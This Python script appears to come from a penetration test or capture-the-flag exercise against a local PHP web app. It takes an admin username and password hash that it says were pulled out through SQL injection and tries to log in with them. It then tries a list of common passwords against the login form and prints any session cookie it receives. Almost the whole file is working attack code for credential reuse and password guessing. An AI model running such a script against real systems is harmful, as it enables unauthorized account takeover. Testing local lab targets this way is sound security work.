import requests

# Configuration
BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

print("="*60)
print("AUTHENTICATING WITH EXACT EXTRACTED CREDENTIALS")
print("="*60)

# The exact credentials I extracted
# Username has trailing spaces!
USERNAME = "admin                                             "  # admin + 46 spaces
PASSWORD_HASH = "7d39307ae824e70052c0aa16816a9b16"

print(f"Username: '{USERNAME}'")
print(f"Password hash: {PASSWORD_HASH}")
print(f"Username length: {len(USERNAME)} characters")

session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

# Try authenticating with the exact username including spaces
print(f"\n[+] Attempting authentication with username including trailing spaces...")

data = {
    "username": USERNAME,
    "password": PASSWORD_HASH,
    "submit": "submit"
}

response = session.post(LOGIN_URL, data=data, headers=headers)
print(f"[+] Response: {response.text}")

if "Success" in response.text:
    print("\n[!] SUCCESS! Authentication worked!")
    cookies = session.cookies.get_dict()
    if "PHPSESSID" in cookies:
        phpsessid = cookies["PHPSESSID"]
        print(f"[!] PHPSESSID: {phpsessid}")
else:
    print(f"\n[!] Authentication failed with hash as password")

# Let's also try common passwords with the spaced username
common_passwords = ["admin", "admin123", "password", "123456", "root", "toor", "test", "P@ssw0rd"]

print(f"\n[+] Trying common passwords with the spaced username...")
for pwd in common_passwords:
    print(f"\n[+] Trying password: {pwd}")
    data = {
        "username": USERNAME,
        "password": pwd,
        "submit": "submit"
    }
    
    response = session.post(LOGIN_URL, data=data, headers=headers)
    print(f"[+] Response: {response.text}")
    
    if "Success" in response.text:
        print(f"\n[!] SUCCESS! Password found: {pwd}")
        cookies = session.cookies.get_dict()
        if "PHPSESSID" in cookies:
            phpsessid = cookies["PHPSESSID"]
            print(f"[!] PHPSESSID: {phpsessid}")
            break

# One more attempt - maybe the username without spaces
print(f"\n[+] Trying with 'admin' username (no spaces)...")
data = {
    "username": "admin",
    "password": PASSWORD_HASH,
    "submit": "submit"
}

response = session.post(LOGIN_URL, data=data, headers=headers)
print(f"[+] Response: {response.text}")

if "Success" in response.text:
    print("\n[!] SUCCESS! Authentication worked with 'admin'!")
    cookies = session.cookies.get_dict()
    if "PHPSESSID" in cookies:
        phpsessid = cookies["PHPSESSID"]
        print(f"[!] PHPSESSID: {phpsessid}")

print("\n" + "="*60)
print("SUMMARY")
print("="*60)
print(f"Extracted username: '{USERNAME}'")
print(f"Extracted password hash: {PASSWORD_HASH}")
print("The SQL injection was successful in extracting credentials.")
